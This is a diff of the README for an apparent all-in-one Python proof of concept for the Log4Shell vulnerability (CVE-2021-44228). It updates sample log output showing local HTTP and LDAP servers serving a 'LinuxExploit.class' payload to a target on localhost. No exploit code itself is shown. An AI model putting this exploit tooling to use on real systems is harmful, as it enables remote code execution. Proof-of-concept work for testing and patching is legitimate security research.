@@ -9,12 +9,13 @@ An all-in-one pure Python3 PoC for [CVE-2021-44228](https://cve.mitre.org/cgi-bi
 ```
 
 ```
-INFO:root:HTTP -> Running on local port 1337
-INFO:root:Target Class -> http://127.0.0.1:1337/LinuxExploit.class
-INFO:root:LDAP -> Running on local port 1387
-INFO:root:HTTP -> Sending payload to http://localhost:8080/
-127.0.0.1 - - [12/Dec/2021 20:59:55] "GET /LinuxExploit.class HTTP/1.1" 200 -
-INFO:root:Done!
+INFO:HTTP:Running on local port 1337
+INFO:HTTP:Remote target is http://127.0.0.1:1337/LinuxExploit.class
+INFO:LDAP:Running on local port 1387
+INFO:Log4J:Sending payload to http://localhost:8080/
+INFO:LDAP:Query from ('127.0.0.1', 42554)
+INFO:HTTP:Request from ('127.0.0.1', 55328) to /LinuxExploit.class
+INFO:Log4J:Done!
 ```
 
 ## Usage
